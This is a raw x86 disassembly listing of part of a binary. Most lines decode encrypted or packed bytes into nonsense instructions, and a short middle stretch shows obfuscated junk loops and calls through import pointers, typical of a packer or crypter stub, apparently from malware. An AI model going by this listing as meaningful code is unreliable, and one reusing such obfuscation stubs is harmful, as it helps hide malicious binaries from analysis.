  409a1c:	(bad)  
  409a1d:	repz inc edi
  409a1f:	push   ecx
  409a20:	inc    ebx
  409a21:	ins    DWORD PTR es:[edi],dx
  409a22:	sub    DWORD PTR [ebx+ebp*4],eax
  409a25:	jp     0xa797a13d
  409a2b:	fisubr WORD PTR [edx+0x7a2e29d8]
  409a31:	and    DWORD PTR [esi+0x80c726a],esi
  409a37:	xor    dh,0x75
  409a3a:	sbb    BYTE PTR [edx+0x17],0x87
  409a3e:	les    edx,FWORD PTR [esi]
  409a40:	mov    DWORD PTR [esp+eiz*2-0x21],ebx
  409a44:	sub    DWORD PTR [eax-0x744feb29],edi
  409a4a:	mov    ebp,ecx
  409a4c:	pop    es
  409a4d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409a4e:	xchg   esp,eax
  409a4f:	pop    esp
  409a50:	dec    ebp
  409a51:	out    0x38,al
  409a53:	mov    esp,0xc2117d00
  409a58:	mov    ecx,edx
  409a5a:	sub    ebx,esp
  409a5c:	pop    ebp
  409a5d:	lock inc esp
  409a5f:	push   ss
  409a60:	aas    
  409a61:	idiv   DWORD PTR [esi-0x16]
  409a64:	cld    
  409a65:	jecxz  0x409a1f
  409a67:	in     eax,0x17
  409a69:	xchg   ebx,eax
  409a6a:	mov    WORD PTR [ecx+0x1],ds
  409a6d:	(bad)  
  409a6e:	fsub   QWORD PTR [edi-0x30178c09]
  409a74:	pop    edi
  409a75:	jmp    0xd83:0xfe4043c6
  409a7c:	loopne 0x409a49
  409a7e:	xor    eax,DWORD PTR [edi+0x4e1ce25]
  409a84:	jbe    0x409ac5
  409a86:	ss inc ebp
  409a88:	pop    edx
  409a89:	sbb    DWORD PTR [esi],esp
  409a8b:	(bad)  
  409a8c:	pop    ss
  409a8d:	test   DWORD PTR [esi],esi
  409a8f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409a90:	jns    0x409ac8
  409a92:	dec    esp
  409a93:	or     ch,BYTE PTR [ecx+0x57a8238d]
  409a99:	or     DWORD PTR [esi-0x767bd52a],edx
  409a9f:	and    dl,BYTE PTR [esi+ebp*8-0xc]
  409aa3:	adc    bl,BYTE PTR [ebx-0x2ed2945a]
  409aa9:	xchg   BYTE PTR [edx],ch
  409aab:	arpl   WORD PTR [esp+ecx*1-0x79],dx
  409aaf:	mov    al,ah
  409ab1:	pop    eax
  409ab2:	push   esi
  409ab3:	popf   
  409ab4:	inc    esp
  409ab5:	mov    al,ds:0x7a238ee0
  409aba:	sub    DWORD PTR [ebx],esp
  409abc:	cdq    
  409abd:	dec    esp
  409abe:	inc    ebx
  409abf:	sbb    ebp,DWORD PTR [ecx]
  409ac1:	cmp    edx,0x67
  409ac4:	sar    bh,1
  409ac6:	nop
  409ac7:	jmp    0x409abf
  409ac9:	jnp    0x409aa8
  409acb:	ret    0xf298
  409ace:	shr    BYTE PTR [edx],0x30
  409ad1:	cs mov esp,0x5e6d9953
  409ad7:	xlat   BYTE PTR ds:[ebx]
  409ad8:	push   ds
  409ad9:	hlt    
  409ada:	popf   
  409adb:	inc    ebx
  409adc:	mov    ch,0xae
  409ade:	test   al,0x81
  409ae0:	test   al,0x1
  409ae2:	inc    esi
  409ae3:	sub    eax,0x50fe027c
  409ae8:	cmp    al,0xc9
  409aea:	push   es
  409aeb:	push   ebx
  409aec:	icebp  
  409aed:	aam    0x2
  409aef:	mov    eax,0x70ed2a06
  409af4:	push   edi
  409af5:	pop    ebp
  409af6:	jg     0x409b36
  409af8:	icebp  
  409af9:	(bad)  
  409afa:	mov    edi,0x4f7bbf6f
  409aff:	out    dx,eax
  409b00:	int3   
  409b01:	pop    es
  409b02:	inc    esi
  409b03:	lods   eax,DWORD PTR ds:[esi]
  409b04:	jo     0x409ae9
  409b06:	loopne 0x409a9f
  409b08:	add    DWORD PTR [eax+ebp*1-0x6dc1ce9e],ecx
  409b0f:	inc    eax
  409b10:	xor    al,0xd6
  409b12:	mov    cs,WORD PTR [esi]
  409b14:	xchg   edi,eax
  409b15:	mov    dh,0x6d
  409b17:	xchg   edx,eax
  409b18:	mov    ebx,0xe21dd429
  409b1d:	or     DWORD PTR [edi-0x5],ebp
  409b20:	push   ss
  409b21:	mov    ebx,0xc3553e21
  409b26:	jmp    0x4ec24602
  409b2b:	call   0xc3a0:0xa08200d4
  409b32:	mov    ds:0x130961f0,al
  409b37:	or     BYTE PTR [eax+edi*8-0x4],cl
  409b3b:	adc    bh,BYTE PTR [edi+0xcca14a0]
  409b41:	xchg   esi,eax
  409b42:	fsubr  QWORD PTR fs:[edx-0x72c50dbd]
  409b49:	sar    BYTE PTR [edi-0x6],1
  409b4c:	int3   
  409b4d:	sub    al,0x29
  409b4f:	hlt    
  409b50:	add    bh,al
  409b52:	add    eax,0x3e5a1e17
  409b57:	adc    eax,0xa5c9458e
  409b5c:	xor    DWORD PTR [ebx+eax*2-0x37c35eff],ebx
  409b63:	daa    
  409b64:	xor    dl,BYTE PTR [esi+0x37]
  409b67:	mov    al,ds:0xfc27b17d
  409b6c:	pushf  
  409b6d:	cmp    BYTE PTR [edi-0x3f4f77ce],bl
  409b73:	call   0x8aa3c08f
  409b78:	lahf   
  409b79:	sub    al,0xeb
  409b7b:	jne    0x409b48
  409b7d:	ror    BYTE PTR [esi],cl
  409b7f:	mov    esi,0xf9c6aaf
  409b84:	mov    BYTE PTR [edi],bh
  409b86:	adc    DWORD PTR [ebx-0x4b],0xcb9a7c44
  409b8d:	fdiv   DWORD PTR [ecx+0x14f856e7]
  409b93:	mov    al,0xa5
  409b95:	mov    ah,dl
  409b97:	iret   
  409b98:	aam    0xb7
  409b9a:	add    DWORD PTR [ecx-0x6cdf9c64],0x8
  409ba1:	and    al,0xdc
  409ba3:	inc    dh
  409ba5:	lds    esi,FWORD PTR [esi]
  409ba7:	adc    eax,0x1d3b8bfb
  409bac:	(bad)  
  409bad:	dec    ecx
  409bae:	pop    ds
  409baf:	pop    edi
  409bb0:	mov    eax,ds:0xe53c4a64
  409bb5:	cmc    
  409bb6:	adc    esp,esp
  409bb8:	cli    
  409bb9:	aas    
  409bba:	inc    ebx
  409bbb:	mov    edi,0xbe5f25a6
  409bc0:	popa   
  409bc1:	rcl    BYTE PTR [edx+edi*8-0x128e3d79],0x95
  409bc9:	dec    eax
  409bca:	enter  0x67e5,0x25
  409bce:	call   0x6e0:0xec8ce768
  409bd5:	and    edi,ebp
  409bd7:	xchg   BYTE PTR ss:[edi-0x5f],ch
  409bdb:	and    edi,edi
  409bdd:	jle    0x409bdd
  409bdf:	int3   
  409be0:	dec    edi
  409be1:	scas   eax,DWORD PTR es:[edi]
  409be2:	(bad)  
  409be3:	sbb    BYTE PTR [esi],dh
  409be5:	test   eax,0x4ecf72b7
  409bea:	out    dx,al
  409beb:	jae    0x409c38
  409bed:	pop    es
  409bee:	xor    DWORD PTR [edi-0x1a9e2a60],0xffffff93
  409bf5:	sbb    al,0x14
  409bf7:	lods   al,BYTE PTR ds:[esi]
  409bf8:	push   ebp
  409bf9:	je     0x409c5a
  409bfb:	pusha  
  409bfc:	bound  esp,QWORD PTR [esi+ebx*4-0x2]
  409c00:	fcom   st(4)
  409c02:	adc    bh,BYTE PTR [esp+ebx*4-0x48]
  409c06:	sub    BYTE PTR [edi],0xb
  409c09:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409c0a:	xor    al,0x89
  409c0c:	or     BYTE PTR [ebx-0x3b],dl
  409c0f:	repnz test DWORD PTR [edx-0x3],ebx
  409c13:	xchg   edi,eax
  409c14:	loopne 0x409be0
  409c16:	scas   al,BYTE PTR es:[edi]
  409c17:	mov    cl,0xf4
  409c19:	cmc    
  409c1a:	adc    al,0xc3
  409c1c:	in     eax,dx
  409c1d:	retf   
  409c1e:	lds    ebx,FWORD PTR [ebx+0x41]
  409c21:	push   cs
  409c22:	push   ecx
  409c23:	leave  
  409c24:	inc    eax
  409c25:	push   ss
  409c26:	sti    
  409c27:	test   al,0x9f
  409c29:	rcl    BYTE PTR [ecx-0x1d],cl
  409c2c:	js     0x409c65
  409c2e:	pop    ebp
  409c2f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409c30:	xor    al,0x2c
  409c32:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409c33:	jge    0x409c02
  409c35:	push   0xffffffe8
  409c37:	mov    edx,0xf4662a83
  409c3c:	add    edx,DWORD PTR [esi+0x6fe81d7e]
  409c42:	test   al,0x77
  409c44:	mov    bh,0x32
  409c46:	jle    0x409cc2
  409c48:	into   
  409c49:	out    dx,eax
  409c4a:	xor    BYTE PTR [edx+0x2c37e62b],ch
  409c50:	(bad)  [esi-0x4420eb24]
  409c56:	xchg   esi,eax
  409c57:	leave  
  409c58:	sti    
  409c59:	push   esp
  409c5a:	imul   ebx,esi,0xffffff91
  409c5d:	sbb    DWORD PTR [esi+0x2aa0d723],eax
  409c63:	push   0x5c371833
  409c68:	jecxz  0x409c38
  409c6a:	loop   0x409c4e
  409c6c:	jle    0x409c13
  409c6e:	cmc    
  409c6f:	jno    0x409c6b
  409c71:	push   es
  409c72:	xlat   BYTE PTR ds:[ebx]
  409c73:	push   esi
  409c74:	fs (bad) 
  409c76:	cwde   
  409c77:	sub    cl,cl
  409c79:	lahf   
  409c7a:	cmp    ah,ch
  409c7c:	dec    esp
  409c7d:	out    dx,eax
  409c7e:	imul   ecx,DWORD PTR [ebp-0x367f627f],0x32
  409c85:	mov    al,ds:0x5475c0c3
  409c8a:	jmp    0x637bedc2
  409c8f:	pop    ebp
  409c90:	push   ebp
  409c91:	mov    ebx,0x6d95eeb1
  409c96:	cli    
  409c97:	(bad)  
  409c98:	daa    
  409c99:	ds mov dl,0x3c
  409c9c:	inc    edi
  409c9d:	fcom   QWORD PTR [eax+0x27450e49]
  409ca3:	scas   al,BYTE PTR es:[edi]
  409ca4:	cld    
  409ca5:	mov    ds:0x7cec1c0f,al
  409caa:	push   edi
  409cab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409cac:	mov    esp,0x7c8856fe
  409cb1:	rol    DWORD PTR [edx],1
  409cb3:	mov    WORD PTR [edi-0x6d],ss
  409cb6:	gs retf 
  409cb8:	dec    edx
  409cb9:	xchg   ebx,eax
  409cba:	dec    esp
  409cbb:	cmp    eax,0x485402ad
  409cc0:	cli    
  409cc1:	xor    ch,BYTE PTR [edx+0x2]
  409cc4:	pop    ebx
  409cc5:	cmp    eax,0xa539fe1b
  409cca:	sub    eax,0xa40c1179
  409ccf:	int3   
  409cd0:	outs   dx,DWORD PTR ds:[esi]
  409cd1:	in     eax,dx
  409cd2:	pop    ds
  409cd3:	dec    esi
  409cd4:	adc    al,0x98
  409cd6:	fisttp WORD PTR [edx+0x63]
  409cd9:	sbb    al,0xbc
  409cdb:	cmp    BYTE PTR [ecx+0x214d36c3],ah
  409ce1:	push   ebp
  409ce2:	push   esp
  409ce3:	jb     0x409d18
  409ce5:	fild   DWORD PTR [esi+0x3f]
  409ce8:	or     DWORD PTR [ecx-0x2d],edi
  409ceb:	ja     0x409c97
  409ced:	sahf   
  409cee:	das    
  409cef:	push   eax
  409cf0:	adc    bh,0xbc
  409cf3:	std    
  409cf4:	and    esi,ecx
  409cf6:	ret    
  409cf7:	dec    ebx
  409cf8:	xor    al,0x57
  409cfa:	aaa    
  409cfb:	and    al,0x29
  409cfd:	sahf   
  409cfe:	inc    edx
  409cff:	shl    BYTE PTR [esi-0x2c],0x65
  409d03:	mov    cl,0xeb
  409d05:	push   cs
  409d06:	and    dh,cl
  409d08:	shr    BYTE PTR [esi+0x475dc943],0xd5
  409d0f:	fdiv   st(1),st
  409d11:	mov    cl,0xfc
  409d13:	leave  
  409d14:	jp     0x409d84
  409d16:	xor    DWORD PTR [ebx-0x1715771e],0x8a72c6b8
  409d20:	(bad)  
  409d21:	data16 xor bh,ah
  409d24:	add    al,0x6
  409d26:	sbb    BYTE PTR [eax],bh
  409d28:	sub    DWORD PTR [edx-0x34],0x2e5a420f
  409d2f:	sbb    eax,0xd3592d45
  409d34:	into   
  409d35:	and    BYTE PTR [esi+0x5e],bl
  409d38:	lahf   
  409d39:	mov    DWORD PTR [ecx],edx
  409d3b:	aad    0xd7
  409d3d:	xor    DWORD PTR [ecx-0x1c],eax
  409d40:	adc    cl,BYTE PTR [edi+0x2f2b558f]
  409d46:	push   ebp
  409d47:	cmp    eax,0x471ff8f8
  409d4c:	(bad)  
  409d4d:	addr16 push edi
  409d4f:	mov    cl,0x54
  409d52:	repnz dec eax
  409d54:	xlat   BYTE PTR ds:[ebx]
  409d55:	cmp    DWORD PTR [ebx],esi
  409d57:	push   es
  409d58:	retf   
  409d59:	rdpmc  
  409d5b:	fs lahf 
  409d5d:	daa    
  409d5e:	or     eax,DWORD PTR [edx]
  409d60:	daa    
  409d61:	call   0x8739c7dd
  409d66:	aas    
  409d67:	xor    edx,DWORD PTR [ecx-0x7a]
  409d6a:	jp     0x409dd2
  409d6c:	icebp  
  409d6d:	arpl   WORD PTR [ebp+0x12e92b5f],si
  409d73:	outs   dx,DWORD PTR ds:[esi]
  409d74:	mov    edi,0x5e4cc3c9
  409d79:	stos   DWORD PTR es:[edi],eax
  409d7a:	rol    cl,cl
  409d7c:	es push 0x70310bf9
  409d82:	fs sti 
  409d84:	jno    0x409e03
  409d86:	xchg   esi,eax
  409d87:	jmp    0x485a:0x76ba0468
  409d8e:	dec    ebp
  409d8f:	test   BYTE PTR [eax+0x666aec85],bh
  409d95:	fwait
  409d96:	fwait
  409d97:	mov    ch,0x46
  409d99:	fist   DWORD PTR [ebp-0x11]
  409d9c:	inc    ecx
  409d9d:	vandnps xmm7,xmm5,XMMWORD PTR [edx]
  409da1:	addr16 pusha 
  409da3:	cwde   
  409da4:	sub    eax,0x80c8688
  409da9:	in     al,0x4f
  409dab:	lds    ebp,FWORD PTR [ebp+0x72]
  409dae:	retf   0x8250
  409db1:	sbb    DWORD PTR [esi+ecx*2],edx
  409db4:	push   cs
  409db5:	xor    DWORD PTR [eax-0x545e3e2],edx
  409dbb:	aas    
  409dbc:	mov    ds:0xf9e9e1a5,al
  409dc1:	pop    esi
  409dc2:	ror    ecx,1
  409dc4:	add    edi,edi
  409dc6:	(bad)  
  409dc7:	repnz std 
  409dc9:	jbe    0x409dd1
  409dcb:	or     eax,0x2abfa695
  409dd0:	cmp    eax,0x7179ebf2
  409dd5:	xor    eax,0xbc46ccb0
  409dda:	fimul  WORD PTR ds:[esi-0x7f09ea74]
  409de1:	pop    es
  409de2:	fdivr  DWORD PTR [eax+edx*1+0x5b]
  409de6:	out    dx,eax
  409de7:	repz sub bh,cl
  409dea:	fidivr WORD PTR [edx+ecx*1+0x13]
  409dee:	out    dx,al
  409def:	fstp   QWORD PTR [ecx]
  409df1:	mov    cl,0x95
  409df3:	hlt    
  409df4:	cmc    
  409df5:	lahf   
  409df6:	and    DWORD PTR [ebx+0x26],ecx
  409df9:	retf   
  409dfa:	and    edi,edi
  409dfc:	fisubr WORD PTR [ebx+0x464ca6a7]
  409e02:	sub    ebx,eax
  409e04:	and    eax,0x9c4f56ed
  409e09:	sub    al,0xe9
  409e0b:	mov    ds:0x893434b7,al
  409e10:	out    dx,eax
  409e11:	inc    edi
  409e12:	jmp    0x409e8a
  409e14:	loope  0x409e73
  409e16:	ja     0x409e75
  409e18:	sub    BYTE PTR [ecx],cl
  409e1a:	bound  ebx,QWORD PTR [ebx-0x68]
  409e1d:	mov    BYTE PTR [esi+0x7d],ch
  409e20:	pop    eax
  409e21:	cmp    ecx,DWORD PTR [edi]
  409e23:	adc    edi,DWORD PTR [esi-0x7f]
  409e26:	retf   
  409e27:	or     BYTE PTR [ebx+esi*1+0x4ac07290],0xdd
  409e2f:	push   eax
  409e30:	push   ds
  409e31:	and    cl,cl
  409e33:	push   es
  409e34:	jno    0x409dcc
  409e36:	leave  
  409e37:	cld    
  409e38:	fs jmp 0x409e11
  409e3b:	(bad)  
  409e3c:	(bad)  
  409e3d:	aad    0xf6
  409e3f:	dec    edx
  409e40:	pop    edi
  409e41:	stc    
  409e42:	leave  
  409e43:	loopne 0x409dd2
  409e45:	call   0x9513:0x82da179e
  409e4c:	fisubr DWORD PTR [ecx+0x14]
  409e4f:	push   ebp
  409e50:	push   ecx
  409e51:	push   eax
  409e52:	div    BYTE PTR [ecx+0x8a9940c]
  409e58:	and    DWORD PTR [ecx+0x64d83362],esp
  409e5e:	shl    dh,1
  409e60:	pushf  
  409e61:	jae    0x409e07
  409e63:	xchg   BYTE PTR [ecx+0x73],ch
  409e66:	or     BYTE PTR [ebx-0x1fb97581],cl
  409e6c:	pop    es
  409e6d:	inc    ebp
  409e6e:	stos   BYTE PTR es:[edi],al
  409e6f:	sbb    al,0x81
  409e71:	loopne 0x409e4f
  409e73:	xchg   ebp,eax
  409e74:	fsub   QWORD PTR [eax]
  409e76:	scas   eax,DWORD PTR es:[edi]
  409e77:	retf   0x63f6
  409e7a:	cdq    
  409e7b:	fsub   QWORD PTR [edx-0x55949796]
  409e81:	sub    cl,BYTE PTR [edx-0x6b]
  409e84:	push   es
  409e85:	and    eax,esi
  409e87:	rcr    DWORD PTR [esi],0x96
  409e8a:	inc    edi
  409e8b:	rcl    DWORD PTR [ebx-0x36],0x20
  409e8f:	pop    es
  409e90:	jecxz  0x409ec9
  409e92:	cld    
  409e93:	sbb    al,0xd7
  409e95:	out    0x4,al
  409e97:	outs   dx,BYTE PTR ds:[esi]
  409e98:	inc    esp
  409e99:	dec    ecx
  409e9a:	jg     0x409e64
  409e9c:	je     0x409e24
  409e9e:	ret    0xc63b
  409ea1:	push   esi
  409ea2:	pusha  
  409ea3:	or     eax,0xb1559d39
  409ea8:	sbb    al,0x22
  409eaa:	pcmpeqb mm4,QWORD PTR [edi-0x6aab050f]
  409eb1:	and    ch,al
  409eb3:	mov    ds:0xc3f79787,al
  409eb8:	mov    bh,0x8d
  409eba:	ds ret 0xc738
  409ebe:	cmp    DWORD PTR [edi-0x4],eax
  409ec1:	xor    al,0xdf
  409ec3:	add    ch,BYTE PTR [eax-0x390c2196]
  409ec9:	inc    ebx
  409eca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409ecb:	shr    esi,0xa7
  409ece:	out    dx,eax
  409ecf:	cdq    
  409ed0:	sar    DWORD PTR [ebp-0x68],cl
  409ed3:	inc    eax
  409ed4:	push   esp
  409ed5:	pop    esi
  409ed6:	dec    ebx
  409ed7:	call   edx
  409ed9:	out    dx,eax
  409eda:	loopne 0x409e98
  409edc:	mov    edx,DWORD PTR ds:0x9a5d87e0
  409ee2:	gs in  al,0x84
  409ee5:	int3   
  409ee6:	jp     0x409eae
  409ee8:	shl    DWORD PTR [ebx+eax*4+0x58b84aa4],0x97
  409ef0:	aaa    
  409ef1:	imul   edx,DWORD PTR [ecx+0x2b],0xffffffcd
  409ef5:	(bad)  
  409ef6:	aaa    
  409ef7:	test   DWORD PTR [ecx],eax
  409ef9:	aam    0x8b
  409efb:	dec    edx
  409efc:	sub    eax,0xe83cd555
  409f01:	add    BYTE PTR [ebx-0x5b],0x63
  409f05:	dec    edx
  409f06:	sbb    dh,0x90
  409f09:	xchg   DWORD PTR [ebx+0x2e],edx
  409f0c:	jg     0x409eee
  409f0e:	sub    bl,BYTE PTR [ebx+0x7882c66d]
  409f14:	jns    0x409f34
  409f16:	call   FWORD PTR ds:0xcb690c8b
  409f1c:	clc    
  409f1d:	cmp    ch,BYTE PTR [edx]
  409f1f:	mov    bl,bl
  409f21:	lds    edx,FWORD PTR [edx]
  409f23:	and    ebx,DWORD PTR [ebx]
  409f25:	imul   ebx,edi,0x5722d4e5
  409f2b:	repz jmp 0x409ed2
  409f2e:	mov    dl,0xd
  409f30:	jno    0x409ee0
  409f32:	popa   
  409f33:	sub    dl,0x65
  409f36:	dec    esp
  409f37:	std    
  409f38:	dec    eax
  409f39:	das    
  409f3a:	(bad)  
  409f3b:	out    dx,eax
  409f3c:	sbb    al,0xbd
  409f3e:	sar    bh,cl
  409f40:	mov    bl,0x89
  409f42:	cdq    
  409f43:	pop    eax
  409f44:	jmp    0x8d579883
  409f49:	mov    edi,0xdb76c412
  409f4e:	inc    ecx
  409f4f:	fild   WORD PTR [esi+0x1f671dde]
  409f55:	(bad)  
  409f56:	aad    0xc1
  409f58:	sbb    BYTE PTR [ebx],dl
  409f5a:	inc    ecx
  409f5b:	jns    0x409f0d
  409f5d:	and    al,0x3a
  409f5f:	out    0x92,eax
  409f61:	outs   dx,DWORD PTR ds:[esi]
  409f62:	pop    ss
  409f63:	nop
  409f64:	dec    ebp
  409f65:	iret   
  409f66:	jecxz  0x409f8b
  409f68:	mov    eax,0xd3818c9c
  409f6d:	jg     0x409ef5
  409f6f:	cmp    BYTE PTR [edi+0x36ea724b],0xfc
  409f76:	(bad)  
  409f77:	cmc    
  409f78:	and    ebx,DWORD PTR [eax+edi*4+0x23]
  409f7c:	push   ss
  409f7d:	clc    
  409f7e:	(bad)  
  409f7f:	repz and BYTE PTR [ebx+0x19880],cl
  409f86:	add    BYTE PTR [ecx+0x42900825],al
  409f8c:	add    BYTE PTR [eax],al
  409f8e:	add    BYTE PTR [eax],al
  409f90:	add    BYTE PTR [ebx],dh
  409f92:	rol    BYTE PTR [ebx],cl
  409f94:	adc    eax,0x429008
  409f99:	inc    edx
  409f9a:	mov    DWORD PTR ds:0x429008,edx
  409fa0:	cmp    DWORD PTR ds:0x429008,0x11
  409fa7:	jne    0x409fe0
  409fad:	push   DWORD PTR [ebp-0x28]
  409fb0:	push   DWORD PTR [ebp-0xc]
  409fb3:	push   0x130f
  409fb8:	push   0x751a
  409fbd:	push   0x8a1e
  409fc2:	push   0x2320
  409fc7:	push   DWORD PTR [ebp-0x24]
  409fca:	push   0x206d
  409fcf:	push   DWORD PTR [ebp-0xc]
  409fd2:	push   DWORD PTR [ebp-0x20]
  409fd5:	push   0x5142
  409fda:	call   DWORD PTR ds:0x42e8db
  409fe0:	cmp    DWORD PTR ds:0x429008,0x10
  409fe7:	jne    0x409ffa
  409fed:	mov    edx,DWORD PTR ds:0x429008
  409ff3:	inc    edx
  409ff4:	mov    DWORD PTR ds:0x429008,edx
  409ffa:	cmp    DWORD PTR ds:0x429008,0x1e
  40a001:	jb     0x409f91
  40a007:	xor    edi,ecx
  40a009:	add    DWORD PTR ds:0x42d000,ebx
  40a00f:	mov    edx,0x3272e2
  40a014:	mov    DWORD PTR ds:0x42c010,0x65c3
  40a01e:	add    edi,edx
  40a020:	cmp    DWORD PTR [eax],edi
  40a022:	mov    DWORD PTR ds:0x42a00c,0xde
  40a02c:	je     0x40a043
  40a032:	mov    eax,DWORD PTR [eax]
  40a034:	mov    DWORD PTR ds:0x42c004,0x3704
  40a03e:	jmp    0x40ea3f
  40a043:	mov    eax,ds:0x42b010
  40a048:	mov    eax,DWORD PTR [ebp+0x18]
  40a04b:	cmp    eax,esi
  40a04d:	mov    DWORD PTR ds:0x42a00c,0x4db6
  40a057:	jne    0x40a071
  40a05d:	mov    DWORD PTR ds:0x42c008,0x3d03
  40a067:	push   0xf89c8584
  40a06c:	jmp    0x40ea2e
  40a071:	mov    esi,DWORD PTR [ebp+0x18]
  40a074:	mov    eax,0xf89c85bb
  40a079:	cmp    esi,eax
  40a07b:	mov    DWORD PTR ds:0x42b008,0x1a7e
  40a085:	jne    0x40ea1e
  40a08b:	sbb    eax,esi
  40a08d:	mov    eax,DWORD PTR [ebp+0x10]
  40a090:	and    DWORD PTR ds:0x42c010,0x0
  40a09a:	mov    esi,DWORD PTR ds:0x42c010
  40a0a0:	inc    esi
  40a0a1:	mov    DWORD PTR ds:0x42c010,esi
  40a0a7:	cmp    DWORD PTR ds:0x42c010,0x1f
  40a0ae:	jne    0x40a0cf
  40a0b4:	push   0x2683
  40a0b9:	push   DWORD PTR [ebp-0x20]
  40a0bc:	push   0x3e9b
  40a0c1:	push   DWORD PTR [ebp-0x20]
  40a0c4:	push   0x63df
  40a0c9:	call   DWORD PTR ds:0x42e8df
  40a0cf:	cmp    DWORD PTR ds:0x42c010,0x13
  40a0d6:	jb     0x40a09a
  40a0dc:	mov    DWORD PTR ds:0x42c008,0x14
  40a0e6:	cmp    DWORD PTR ds:0x42c008,0x0
  40a0ed:	je     0x40a126
  40a0f3:	cmp    DWORD PTR ds:0x42c008,0x1c
  40a0fa:	jne    0x40a106
  40a100:	call   DWORD PTR ds:0x42e91b
  40a106:	xor    esi,esi
  40a108:	xor    esi,DWORD PTR ds:0x42c008
  40a10e:	dec    esi
  40a10f:	mov    DWORD PTR ds:0x42c008,esi
  40a115:	jmp    0x40a0e6
  40a11a:	mov    esi,DWORD PTR ds:0x42901c
  40a120:	or     DWORD PTR ds:0x429020,esi
  40a126:	xor    eax,ecx
  40a128:	and    esi,DWORD PTR ds:0x42c018
  40a12e:	add    eax,edx
  40a130:	and    DWORD PTR ds:0x42c004,0x0
  40a13a:	xor    esi,esi
  40a13c:	add    esi,DWORD PTR ds:0x42c004
  40a142:	inc    esi
  40a143:	mov    DWORD PTR ds:0x42c004,esi
  40a149:	cmp    DWORD PTR ds:0x42c004,0xd
  40a150:	jne    0x40a164
  40a156:	push   0x6b46
  40a15b:	push   DWORD PTR [ebp-0x10]
  40a15e:	call   DWORD PTR ds:0x42e91f
  40a164:	cmp    DWORD PTR ds:0x42c004,0xc
  40a16b:	jne    0x40a180
  40a171:	xor    esi,esi
  40a173:	xor    esi,DWORD PTR ds:0x42c004
  40a179:	inc    esi
  40a17a:	mov    DWORD PTR ds:0x42c004,esi
  40a180:	cmp    DWORD PTR ds:0x42c004,0x1b
  40a187:	jb     0x40a13a
  40a18d:	xor    esi,esi
  40a18f:	xor    esi,DWORD PTR ds:0x42c010
  40a195:	or     esi,DWORD PTR ds:0x429000
  40a19b:	mov    DWORD PTR ds:0x42c010,esi
  40a1a1:	mov    DWORD PTR [ebp-0x18],eax
  40a1a4:	mov    eax,DWORD PTR [ebp+0xc]
  40a1a7:	mov    esi,DWORD PTR [ebp-0x8]
  40a1aa:	xor    eax,ecx
  40a1ac:	add    eax,edx
  40a1ae:	mov    DWORD PTR ds:0x429018,0x1094
  40a1b8:	imul   eax,DWORD PTR [esi]
  40a1bb:	and    DWORD PTR ds:0x42900c,0x0
  40a1c5:	mov    esi,DWORD PTR ds:0x42900c
  40a1cb:	inc    esi
  40a1cc:	mov    DWORD PTR ds:0x42900c,esi
  40a1d2:	cmp    DWORD PTR ds:0x42900c,0x1f
  40a1d9:	jne    0x40a1e8
  40a1df:	push   DWORD PTR [ebp-0x10]
  40a1e2:	call   DWORD PTR ds:0x42e8b7
  40a1e8:	cmp    DWORD PTR ds:0x42900c,0x1d
  40a1ef:	jb     0x40a1c5
  40a1f5:	mov    esi,DWORD PTR [ebp+0x8]
  40a1f8:	xor    esi,ecx
  40a1fa:	add    esi,edx
  40a1fc:	cmp    esi,eax
  40a1fe:	mov    eax,DWORD PTR [ebp-0x4]
  40a201:	push   ebx
  40a202:	je     0x40a221
  40a208:	mov    esi,DWORD PTR [ebp-0x18]
  40a20b:	add    DWORD PTR [eax],esi
  40a20d:	mov    eax,DWORD PTR [ebp-0x4]
  40a210:	mov    esi,DWORD PTR [ebp+0xc]
  40a213:	xor    esi,ecx
  40a215:	add    esi,edx
  40a217:	imul   esi,DWORD PTR [eax]
  40a21a:	mov    DWORD PTR [eax],esi
  40a21c:	jmp    0x40a226
  40a221:	mov    esi,DWORD PTR [ebp+0x14]
  40a224:	xor    DWORD PTR [eax],esi
  40a226:	mov    eax,DWORD PTR [ebp-0x4]
  40a229:	mov    edi,DWORD PTR [ebp+0x10]
  40a22c:	xor    edi,ecx
  40a22e:	mov    esi,0xffcd8d1e
  40a233:	mov    ebx,esi
  40a235:	sub    ebx,edi
  40a237:	add    DWORD PTR [eax],ebx
  40a239:	mov    eax,DWORD PTR [ebp-0x4]
  40a23c:	mov    edi,DWORD PTR [ebp-0x8]
  40a23f:	jmp    0x40c58e
  40a244:	pusha  
  40a245:	sub    DWORD PTR [ebx-0x11],eax
  40a248:	repz ja 0x40a1fb
  40a24b:	xchg   ebx,eax
  40a24c:	cli    
  40a24d:	adc    bl,ah
  40a24f:	je     0x40a2b7
  40a251:	push   esp
  40a252:	xchg   DWORD PTR ds:0x7c7c05d0,edx
  40a258:	dec    esi
  40a259:	pop    edi
  40a25a:	jl     0x40a2d8
  40a25c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a25d:	push   edi
  40a25e:	mov    ds:0xb0a55c47,eax
  40a263:	push   edx
  40a264:	repz (bad) 
  40a266:	jmp    0x40a205
  40a268:	adc    eax,ebx
  40a26a:	jecxz  0x40a1f5
  40a26c:	inc    esi
  40a26d:	mov    WORD PTR [ecx],fs
  40a26f:	(bad)  
  40a271:	mov    edx,0x392ce1ff
  40a276:	arpl   WORD PTR [eax-0x55],bp
  40a279:	adc    DWORD PTR [ebx+0x31f9bf3d],0xd56bc7d2
  40a283:	and    BYTE PTR [edx],ah
  40a285:	add    al,0xd
  40a287:	jno    0x40a266
  40a289:	inc    esp
  40a28b:	sub    ecx,esi
  40a28d:	in     eax,0x11
  40a28f:	repz pop esi
  40a291:	jg     0x40a2db
  40a293:	cmp    eax,0x295904e3
  40a298:	sar    DWORD PTR [ebx+0x4071fefb],1
  40a29e:	es in  al,0xa9
  40a2a1:	shl    DWORD PTR [eax+0x6cb20726],1
  40a2a7:	and    BYTE PTR [eax+0x6fd5abbf],bl
  40a2ad:	jnp    0x40a265
  40a2af:	jge    0x40a233
  40a2b1:	dec    ebp
  40a2b2:	or     edx,DWORD PTR [edx]
  40a2b4:	xor    WORD PTR [esp+eiz*8],0xcea
  40a2ba:	mov    eax,0x14a32442
